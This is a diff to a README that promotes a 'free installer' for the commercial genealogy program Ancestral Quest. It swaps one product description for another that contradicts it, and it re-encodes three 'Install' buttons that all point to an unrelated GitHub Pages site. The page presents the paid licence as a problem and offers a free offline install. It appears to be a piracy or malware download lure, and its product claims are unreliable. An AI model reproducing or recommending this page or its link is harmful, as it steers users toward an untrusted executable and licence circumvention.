@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Genealogy-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Ancestral Quest Free Installer** — Ancestral Quest is a Windows genealogy software with deep integration with the FamilySearch Family Tree database. Works without internet access, no account required. Full offline installation.
+**💻 Ancestral Quest Free Installer** — Ancestral Quest is a comprehensive genealogy software for Windows and macOS that manages family trees with thousands of individuals, multimedia attachments, and GEDCOM compatibility for exchanging data with other genealogy applications. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral%20Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral+Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Ancestral Quest
 
-Ancestral Quest is a Windows genealogy software with deep integration with the FamilySearch Family Tree database. It supports GEDCOM, multimedia management, and enables sharing and collaborating on family history research with the world's largest free genealogy database.
+Ancestral Quest is a comprehensive genealogy software for Windows and macOS that manages family trees with thousands of individuals, multimedia attachments, and GEDCOM compatibility for exchanging data with other genealogy applications. Features DNA integration, relationship calculators, and various family tree report formats popular with serious family history researchers.
 
 ---
 
 ## ❌ Problem: Ancestral Quest is hard to access
 
-- **Windows Only** — No macOS or Linux native version
-- **FamilySearch Focus** — Maximum value within the FamilySearch ecosystem
-- **Paid License** — Requires purchase for full feature access
-- **Interface Style** — UI reflects older Windows application design conventions
+- **Commercial License** — Full version requires purchase
+- **Platform Availability** — Primary focus on Windows; macOS version has feature differences
+- **Online Integration** — Integration with online genealogy databases may require additional subscriptions
+- **Learning Curve** — Comprehensive genealogy software has a learning curve for new researchers
 
 ---
 
@@ -81,7 +81,7 @@ Ancestral Quest is a Windows genealogy software with deep integration with the F
 
 <div align="center">
 
-[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral%20Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral+Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Ancestral Quest is a Windows genealogy software with deep integration with the F
 
 ---
 
-**Ancestral Quest Free Installer** — Ancestral Quest is a Windows genealogy software with deep integration with the FamilySearch Family Tree database. Install without internet connection today!
+**Ancestral Quest Free Installer** — Ancestral Quest is a comprehensive genealogy software for Windows and macOS that manages family trees with thousands of individuals, multimedia attachments, and GEDCOM compatibility for exchanging data with other genealogy applications. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral%20Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Ancestral Quest](https://img.shields.io/badge/⬇_Install_Ancestral+Quest-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
